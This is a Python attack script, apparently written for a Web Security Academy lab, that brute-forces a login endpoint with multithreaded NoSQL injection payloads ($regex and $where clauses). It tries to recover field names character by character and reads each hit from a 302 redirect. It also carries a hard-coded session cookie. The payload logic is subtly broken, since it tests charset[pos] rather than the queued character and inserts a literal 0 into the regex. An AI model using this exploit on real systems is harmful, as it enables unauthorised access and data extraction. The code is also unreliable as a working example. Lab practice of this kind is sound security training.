import requests
import threading
import queue

# target endpoint
url = "https://0a8700c00338427c8291b584005f00be.web-security-academy.net/login"
cookie = {"session": "5SiDAqKKa5XEcvgnizTHwLgP46S2bq4C"}
headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0"
}

# characters to test
charset = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"


# thread-safe queue
tasks = queue.Queue()

# worker function
def worker():
    while not tasks.empty():
        pos, char = tasks.get()
        payload = {
            "username": "wiener",
            "password":{"$regex":"^a*"},
            "$where":f"Object.keys(this)[{pos}].match('^.{0}{charset[pos]}.*')"
        }

        try:
            r = requests.post(url, json=payload, headers=headers, cookies=cookie, allow_redirects=False)
            if r.status_code == 302:
                print(f"[+] Hit at pos={pos} with char={char}")
            else:
                print(f"[-] Miss at pos={pos} with char={char} (status {r.status_code})")
        except Exception as e:
            print(f"Request failed: {e}")
        finally:
            tasks.task_done()

# populate queue with (position, char) tuples
for pos in range(0, 10):  # adjust positions
    for char in charset:
        tasks.put((pos, char))

# start threads
threads = []
for i in range(5):  # number of worker threads
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

# wait for all tasks to finish
tasks.join()

print("Done.")
